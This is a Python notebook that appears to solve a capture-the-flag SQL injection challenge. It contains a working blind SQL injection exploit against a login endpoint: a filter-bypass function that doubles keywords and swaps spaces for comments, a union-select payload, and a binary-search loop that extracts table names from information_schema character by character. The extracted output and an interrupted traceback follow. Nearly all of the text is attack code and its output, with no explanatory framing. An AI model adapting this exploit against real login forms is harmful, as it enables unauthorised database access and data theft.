# %%
import requests

# %%
def waf(p):
    p = p.replace(" ", "/**/")
    p = p.replace("union", "uniunionon")
    p = p.replace("select", "seleselectct")
    p = p.replace("where", "whwhereere")
    p = p.replace("and", "aandnd")
    p = p.replace("or", "oorr")
    return p

def check(password):
    payload = waf(password) + '#'
    retry = 3
    while retry > 0:
        res = requests.post("https://sqli.chal.h4ck3r.quest/login", data={"username": "\\", "password": payload})
        if res.status_code == 200:
            # print(res.text)
            return res.text == 'Welcome!'
        retry -= 1
        
    raise Exception("retry failed!")

# %%
# crack table_name
base_password=" union select 1,2,3"

# %%
def crack_ascii(pos):
    start = 0
    end = 128
    while start <= end:
        mid = int(start + (end - start) / 2)
        # print(start, mid, end)
        password = base_password + f" where (ascii(mid((select group_concat(table_name, 0x0a) from information_schema.tables),{pos},1))<{mid})"
        stat = check(password)
        if stat == True:
            end = mid - 1
            if start > end:
                return end
        else:
            start = mid + 1
            if start > end:
                return mid
            
table_name = ""
for i in range(1, 1000):
    table_name += chr(crack_ascii(i))
    print(table_name, "\n")
# Out:
# h
#
# h3
#
# h3y
#
# h3y_
#
# h3y_h
#
# h3y_he
#
# h3y_her
#
# h3y_here
#
# h3y_here_
#
# h3y_here_1
#
# h3y_here_15
#
# h3y_here_15_
#
# h3y_here_15_t
#
# h3y_here_15_th
#
# h3y_here_15_the
#
# h3y_here_15_the_
#
# h3y_here_15_the_f
#
# h3y_here_15_the_fl
#
# h3y_here_15_the_fla
#
# h3y_here_15_the_flag
#
# h3y_here_15_the_flag_
#
# h3y_here_15_the_flag_y
#
# h3y_here_15_the_flag_y0
#
# h3y_here_15_the_flag_y0u
#
# h3y_here_15_the_flag_y0u_
#
# h3y_here_15_the_flag_y0u_w
#
# h3y_here_15_the_flag_y0u_w4
#
# h3y_here_15_the_flag_y0u_w4n
#
# h3y_here_15_the_flag_y0u_w4nt
#
# h3y_here_15_the_flag_y0u_w4nt,
#
# h3y_here_15_the_flag_y0u_w4nt,m
#
# h3y_here_15_the_flag_y0u_w4nt,me
#
# h3y_here_15_the_flag_y0u_w4nt,meo
#
# h3y_here_15_the_flag_y0u_w4nt,meow
#
# h3y_here_15_the_flag_y0u_w4nt,meow,
#
# h3y_here_15_the_flag_y0u_w4nt,meow,f
#
# h3y_here_15_the_flag_y0u_w4nt,meow,fl
#
# h3y_here_15_the_flag_y0u_w4nt,meow,fla
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
#
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,u
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,us
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,use
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,user
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
#
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,A
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,AD
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADM
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMI
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMIN
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINI
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINIS
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINIST
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINISTR
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINISTRA
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINISTRAB
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINISTRABL
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINISTRABLE
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINISTRABLE_
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINISTRABLE_R
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINISTRABLE_RO
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINISTRABLE_ROL
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINISTRABLE_ROLE
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINISTRABLE_ROLE_
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINISTRABLE_ROLE_A
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINISTRABLE_ROLE_AU
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINISTRABLE_ROLE_AUT
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINISTRABLE_ROLE_AUTH
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINISTRABLE_ROLE_AUTHO
#
# h3y_here_15_the_flag_y0u_w4nt,meow,flag
# ,users
# ,ADMINISTRABLE_ROLE_AUTHOR
# ---------------------------------------------------------------------------
# KeyboardInterrupt                         Traceback (most recent call last)
# /tmp/ipykernel_213163/2942564664.py in <module>
#      18 table_name = ""
#      19 for i in range(1, 1000):
# ---> 20     table_name += chr(crack_ascii(i))
#      21     print(table_name, "\n")
#
# /tmp/ipykernel_213163/2942564664.py in crack_ascii(pos)
#       6         # print(start, mid, end)
#       7         password = base_password + f" where (ascii(mid((select group_concat(table_name, 0x0a) from information_schema.tables),{pos},1))<{mid})"
# ----> 8         stat = check(password)
#       9         if stat == True:
#      10             end = mid - 1
#
# /tmp/ipykernel_213163/2822294746.py in check(password)
#      12     retry = 3
#      13     while retry > 0:
# ---> 14         res = requests.post("https://sqli.chal.h4ck3r.quest/login", data={"username": "\\", "password": payload})
#      15         if res.status_code == 200:
#      16             # print(res.text)
#
# /usr/lib/python3/dist-packages/requests/api.py in post(url, data, json, **kwargs)
#     117     """
#     118
# --> 119     return request('post', url, data=data, json=json, **kwargs)
#     120
#     121
#
# /usr/lib/python3/dist-packages/requests/api.py in request(method, url, **kwargs)
#      59     # cases, and look like a memory leak in others.
#      60     with sessions.Session() as session:
# ---> 61         return session.request(method=method, url=url, **kwargs)
#      62
#      63
#
# /usr/lib/python3/dist-packages/requests/sessions.py in request(self, method, url, params, data, headers, cookies, files, auth, timeout, allow_redirects, proxies, hooks, stream, verify, cert, json)
#     526             hooks=hooks,
#     527         )
# --> 528         prep = self.prepare_request(req)
#     529
#     530         proxies = proxies or {}
#
# /usr/lib/python3/dist-packages/requests/sessions.py in prepare_request(self, request)
#     454
#     455         p = PreparedRequest()
# --> 456         p.prepare(
#     457             method=request.method.upper(),
#     458             url=request.url,
#
# /usr/lib/python3/dist-packages/requests/models.py in prepare(self, method, url, headers, files, data, params, auth, cookies, hooks, json)
#     316         self.prepare_url(url, params)
#     317         self.prepare_headers(headers)
# --> 318         self.prepare_cookies(cookies)
#     319         self.prepare_body(data, files, json)
#     320         self.prepare_auth(auth, url)
#
# /usr/lib/python3/dist-packages/requests/models.py in prepare_cookies(self, cookies)
#     573             self._cookies = cookiejar_from_dict(cookies)
#     574
# --> 575         cookie_header = get_cookie_header(self._cookies, self)
#     576         if cookie_header is not None:
#     577             self.headers['Cookie'] = cookie_header
#
# /usr/lib/python3/dist-packages/requests/cookies.py in get_cookie_header(jar, request)
#     139     :rtype: str
#     140     """
# --> 141     r = MockRequest(request)
#     142     jar.add_cookie_header(r)
#     143     return r.get_new_headers().get('Cookie')
#
# /usr/lib/python3/dist-packages/requests/cookies.py in __init__(self, request)
#      38         self._r = request
#      39         self._new_headers = {}
# ---> 40         self.type = urlparse(self._r.url).scheme
#      41
#      42     def get_type(self):
#
# /usr/lib/python3.9/urllib/parse.py in urlparse(url, scheme, allow_fragments)
#     397     else:
#     398         params = ''
# --> 399     result = ParseResult(scheme, netloc, url, params, query, fragment)
#     400     return _coerce_result(result)
#     401
#
# <string> in <lambda>(_cls, scheme, netloc, path, params, query, fragment)
#
# KeyboardInterrupt:
